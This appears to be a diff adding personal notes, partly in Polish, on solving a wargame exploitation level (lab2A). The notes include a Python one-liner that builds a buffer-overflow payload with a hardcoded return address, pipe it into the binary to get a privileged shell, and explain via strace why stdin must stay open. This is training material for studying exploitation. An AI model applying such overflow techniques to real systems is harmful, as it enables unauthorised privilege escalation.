@@ -1,0 +1,23 @@
+python -c 'print "19999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999\n"+"2\n"+"3\n"+"\xFD\n"+"\x86\n"+"\x04\n"+"\x08\n"+"8\n"+"9\n"+"1000000000000000000000000000000000000000000000000000000000000000000000000000000\n"' > /tmp/abc.txt
+
+lab2A@warzone:/levels/lab02$ (cat /tmp/abc2.txt; cat) | ./lab2A
+Input 10 words:
+Failed to read word
+You got it
+id
+uid=1008(lab2A) gid=1009(lab2A) euid=1009(lab2end) groups=1010(lab2end),1001(gameuser),1009(lab2A)
+
+
+Now, if we try to cat this into ./lab2A, we get a segfault. This is because the program starts a shell
+process after we have closed stdin, so we need to keep stdin open. We do this using (cat payload; cat) | ./binary"
+
+strace -f !
+
+W przypadku:
+
+strace -f ./lab2A < /tmp/abc.txt :
+
+[pid  1498] read(0, "", 8192)           = 0
+[pid  1498] exit_group(0)               = ?
+
+czyta z stdin i nic nie dostaje, więc program "wychodzi".
